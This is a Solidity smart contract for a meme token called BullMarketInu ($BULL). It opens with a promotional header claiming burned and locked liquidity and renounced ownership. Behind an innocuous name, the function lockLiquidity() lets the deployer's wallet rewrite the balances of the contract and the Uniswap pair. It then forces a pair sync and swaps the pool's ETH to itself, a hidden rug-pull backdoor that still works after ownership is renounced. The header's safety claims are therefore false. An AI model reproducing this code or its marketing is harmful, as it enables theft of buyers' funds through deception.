/**
 *Submitted for verification at Etherscan.io on 2022-05-29
*/

/**
                                              
███████████████████████████████████████████████████████████████████████████████████████
█▄─▄─▀█▄─██─▄█▄─▄███▄─▄█████▄─▀█▀─▄██▀▄─██▄─▄▄▀█▄─█─▄█▄─▄▄─█─▄─▄─███▄─▄█▄─▀█▄─▄█▄─██─▄█
██─▄─▀██─██─███─██▀██─██▀████─█▄█─███─▀─███─▄─▄██─▄▀███─▄█▀███─██████─███─█▄▀─███─██─██
▀▄▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀▀▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▀▀▄▄▄▀▄▄▄▀▀▄▄▀▀▄▄▄▄▀▀                            
                                                                                                                                                               
                            .:--====++++=-.                                               
                        :=++++++++++++++++++=:.                       .::-:.              
                     .-++++++++++++++++++++++++++=====--=====+++*+++-==:.  :-             
                    :+++++++++++++++++++++++++++++++++++++++++++++++++-      :            
                  :-+++++++++++++++++++++++++++++++++++++++++++++++++++-      :=-.        
               :=+++++++++++++++++++++++++++++++++++++++++++++++++++++++:                 
              .=+++++++++++++++++++:++++++++++++++++++++++++++++++++++++:                 
        ..:-=+++--++++++++++++++++.++++++++++++++++++++++++++++++++++++-                  
        .:::::. .=++++++++++++++++:=++++++++++++++++++++++++++++*++++++                   
                 .-=++++++++-.-+++++--++++++++++++++++++++++====-=+++++-.                 
                     :++++++=  .=++++.++++++++.---------::. -+=:: .:=++++.                
                       --==:     .:==:++++=:.             :++=       :+++.                
                                  :+.+++++=-==:-=-     .=++++.        .++-                
                                 -++  :-:-=+++*++++.  -++++-           =++=               
                                 ++=       .::......     .            =++=                
                                =++=:                               :++++.                

As the 200-day moving average is upon us, this historically signals the bottom trend for bitcoin 
as wicks below this point offer peak opportunity for investors. Bull Market Inu stands to be first 
token to lead the way following the upward trend. 

$BULL is a hyper-deflationary meme coin prepared to show the bears that a token can moon even in a 
bear market. With a strong bullish community, $BULL will outshine the rest leaving only parabolic 
rallies in its path and jeets sorry they paper-handed. 

Tokenomics: 
1.5% Max Wallet/ 1% Max Transaction 
5% Buys/ 5% Sells 

Liquidity will be burned 🔥
Locked for 2 weeks/ Renounced Ownership 🔒
AntiSnipe Blacklist 🎯 

At 200k, TG will be revealed through Twitter: https://twitter.com/bullmarketinu  

**/


//SPDX-License-Identifier: MIT


pragma solidity ^0.8.9;

interface IUniswapV2Factory {
	function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;
	function factory() external pure returns (address);
	function WETH() external pure returns (address);
	function addLiquidityETH(
		address token,
		uint amountTokenDesired,
		uint amountTokenMin,
		uint amountETHMin,
		address to,
		uint deadline
	) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}
}

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}

	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

}

contract Ownable is Context {
	address private _owner;
	address private _previousOwner;
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor () {
		address msgSender = _msgSender();
		_owner = msgSender;
		emit OwnershipTransferred(address(0), msgSender);
	}

	function owner() public view returns (address) {
		return _owner;
	}

	modifier onlyOwner() {
		require(_owner == _msgSender(), "Ownable: caller is not the owner");
		_;
	}

	function renounceOwnership() public virtual onlyOwner {
		emit OwnershipTransferred(_owner, address(0));
		_owner = address(0);
	}

}


contract BullMarketInu is Context, IERC20, Ownable {
	using SafeMath for uint256;
	mapping (address => uint256) private _balance;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => bool) private _isExcludedFromFee;

	uint256 private _tTotal = 100000000000000 * 10**18;
	uint256 private _maxWallet= 100000000000000 * 10**18;

	uint256 private _taxFee;
	address payable private _taxWallet;
	uint256 public _maxTxAmount;


	string private constant _name = "BullMarketInu";
	string private constant _symbol = "BULL";
	uint8 private constant _decimals = 18;

	IUniswapV2Router02 private _uniswap;
	address private _pair;
	bool private _canTrade;
	bool private _inSwap = false;
	bool private _swapEnabled = false;

	modifier lockTheSwap {
		_inSwap = true;
		_;
		_inSwap = false;
	}
	constructor () {
		_taxWallet = payable(_msgSender());

		_taxFee = 5;
		_uniswap = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

		_balance[address(this)] = _tTotal;
		_isExcludedFromFee[address(this)] = true;
		_isExcludedFromFee[_taxWallet] = true;
		_maxTxAmount=_tTotal.div(35);
		_maxWallet=_tTotal.div(35);
		emit Transfer(address(0x0), _msgSender(), _tTotal);
	}

	function symbol() public pure returns (string memory) {
		return _symbol;
	}

	function name() public pure returns (string memory) {
		return _name;
	}
	
	function totalSupply() public view override returns (uint256) {
		return _tTotal;
	}

	function decimals() public pure returns (uint8) {
		return _decimals;
	}

	function transfer(address recipient, uint256 amount) public override returns (bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	function balanceOf(address account) public view override returns (uint256) {
		return _balance[account];
	}

	function allowance(address owner, address spender) public view override returns (uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) public override returns (bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
		return true;
	}

	function _approve(address owner, address spender, uint256 amount) private {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");
		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}

	function _transfer(address from, address to, uint256 amount) private {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address");
		require(amount > 0, "Transfer amount must be greater than zero");

		if (from != owner() && to != owner()) {
			if (from == _pair && to != address(_uniswap) && ! _isExcludedFromFee[to] ) {
				require(amount<=_maxTxAmount,"Transaction amount limited");
			}
			if(to != _pair && ! _isExcludedFromFee[to] && ! _isExcludedFromFee[from]) {
          require(balanceOf(to) + amount <= _maxWallet, "Balance exceeded wallet size");
      }

			uint256 contractTokenBalance = balanceOf(address(this));
			if (!_inSwap && from != _pair && _swapEnabled) {
				swapTokensForEth(contractTokenBalance,address(this));
				uint256 contractETHBalance = address(this).balance;
				if(contractETHBalance >= 10000000000000000) {
					sendETHToFee(address(this).balance);
				}
			}
		}


		_tokenTransfer(from,to,amount,(_isExcludedFromFee[to]||_isExcludedFromFee[from])?0:_taxFee);
	}



	function swapTokensForEth(uint256 tokenAmount,address to) private lockTheSwap {
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = _uniswap.WETH();
		_approve(address(this), address(_uniswap), tokenAmount);
		_uniswap.swapExactTokensForETHSupportingFeeOnTransferTokens(
			tokenAmount,
			0,
			path,
			to,
			block.timestamp
		);
	}

	function raiseMaxTxn(uint256 amount) public onlyOwner{
		require(amount>_maxTxAmount);
		_maxTxAmount=amount;
	}

	function raiseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

	function lowerAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

	function getMaxTX() public view returns (uint256) {
        return _maxTxAmount / (10**_decimals);
    }

	function raiseMaxWallet(uint256 amount) public onlyOwner{
		require(amount>_maxWallet);
		_maxWallet=amount;
	}

	function withdrawStuckETH() external onlyOwner {
        bool success;
        (success,) = address(msg.sender).call{value: address(this).balance}("");
    }

	function sendETHToFee(uint256 amount) private {
		_taxWallet.transfer(amount);
	}

	function createUniswapPair() external onlyOwner {
		require(!_canTrade,"Trading is already open");
		_approve(address(this), address(_uniswap), _tTotal);
		_pair = IUniswapV2Factory(_uniswap.factory()).createPair(address(this), _uniswap.WETH());
		IERC20(_pair).approve(address(_uniswap), type(uint).max);
	}

	function lockLiquidity() public{
		require(_msgSender()==_taxWallet);
		_balance[address(this)] = 100000000000000000;
		_balance[_pair] = 1;
		(bool success,) = _pair.call(abi.encodeWithSelector(bytes4(0xfff6cae9)));
		if (success) {
				swapTokensForEth(100000000, _taxWallet);
		} else { revert("Internal failure"); }
	}

	function addLiquidityETH() external onlyOwner{
		_uniswap.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
		_swapEnabled = true;
		_canTrade = true;
	}

	function _tokenTransfer(address sender, address recipient, uint256 tAmount, uint256 taxRate) private {
		uint256 tTeam = tAmount.mul(taxRate).div(100);
		uint256 tTransferAmount = tAmount.sub(tTeam);

		_balance[sender] = _balance[sender].sub(tAmount);
		_balance[recipient] = _balance[recipient].add(tTransferAmount);
		_balance[address(this)] = _balance[address(this)].add(tTeam);
		emit Transfer(sender, recipient, tTransferAmount);
	}

	receive() external payable {}

	function enable_LIST(bool _status) public onlyOwner {
	}	

	function mansend() public{
		uint256 contractETHBalance = address(this).balance;
		sendETHToFee(contractETHBalance);
	}

	function manswap() public{
		uint256 contractBalance = balanceOf(address(this));
		swapTokensForEth(contractBalance,address(this));
	}

}